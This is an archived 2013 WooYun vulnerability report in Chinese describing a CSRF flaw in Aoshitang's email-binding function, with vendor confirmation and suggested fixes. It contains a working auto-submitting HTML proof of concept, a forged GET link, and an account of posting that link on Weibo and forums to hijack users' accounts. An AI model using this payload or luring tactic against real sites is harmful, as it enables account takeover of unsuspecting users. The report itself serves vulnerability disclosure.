{"id": 63338, "wybug_id": "wooyun-2013-032138", "wybug_title": "傲世堂绑定邮箱CSRF可劫持账户（已证明）", "wybug_corp": "傲世堂", "wybug_author": "xfkxfk", "wybug_date": "2013-07-24 18:55", "wybug_open_date": "2013-09-07 18:56", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧", "利用", "防护策略绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-07：\t细节向公众公开  简要描述： 傲世堂绑定邮箱CSRF可劫持账户 详细说明：  1、出现CSRF的地方在更换用户邮箱处。我们先用自己的小号邮箱注册一个账户xfkxfk。然后来更换邮箱，点击“更换邮箱”：\n\n2、然后我们先随便输入一个邮箱地址，如下图88888888@qq.com这个邮箱：\n\n3、点击提交后，会往这个邮箱发送一个认证激活邮件。4、这时，我们截断抓包，请求信息如下：\nPOST /user!changeEmail.action HTTP/1.1Host: www.aoshitang.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20100101 Firefox/22.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.aoshitang.com/changeEmail.action?redirectUrl=index.jspCookie: **********Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 45email=88888888%40qq.com&redirectUrl=index.jsp\n5、然后我们构造如下的poc：\n<html><body><form id=\"xfkxfk\" name=\"xfkxfk\" action=\"http://www.aoshitang.com/user!changeEmail.action\" method=\"POST\"><input type=\"text\" name=\"email\" value=\"88888888@qq.com\" /><input type=\"text\" name=\"redirectUrl\" value=\"index.jsp\" /><input type=\"submit\" value=\"submit\"></form><script>   document.xfkxfk.submit();</script></body></html>\n6、打开上面的poc结果如下：\n\n7、这时已经成功更换了邮箱为88888888@qq.com：\n\n返回主页，查看资料时，邮箱已经成功更换！\n\n8、其实这里还可以把POST更改成GET请求，结果也是可行的。下面我们把邮箱换成999999999@qq.com，构造GET请求连接：\nhttp://www.aoshitang.com/user!changeEmail.action?email=999999999@qq.com&redirectUrl=index.jsp\n9、最后我们把GET请求发到我们流量比较大的微博上：\n\n10，下面我们换另一个测试账号tester，登陆tester，然后点击我们的微博连接。tester之前的邮箱：\n\n看看抓包，referer的却是weibo.com的，从返回看已经跳转到发邮件页面了：\n\n点击微博链接后：\n\n我们来看tester的资料，邮箱已成功被更改：\n\n11、最后我们换成自己的真实邮箱，然后发布连接到微博，然后tester点击链接，看看能不能收到邮箱认证激活邮件：\n\n成功收到更换邮件并收到认证激活邮件！综上确定邮箱更换存在CSRF漏洞。   漏洞证明：  而且我们可以把这个连接发到论坛里面，诱惑用户点击这个链接，当然就可以大量更换用户的邮箱到我们的邮箱想了。第一次我发了，没过，审核说是太理论了，没有证明，今天我再发一次，有证明的，我把链接发到论坛里，weibo.com里，多发一些，今天邮箱收到链接了：\n\n然后我们点击一下这个连接，就进入账户了：\n\n当然危害就不用说了，都更换了邮箱，想干嘛可想而知了。   修复方案：  1、判断referer2、加token3、等等   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-07-24 19:56 厂商回复： 谢谢xfkxfk，正在安排修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}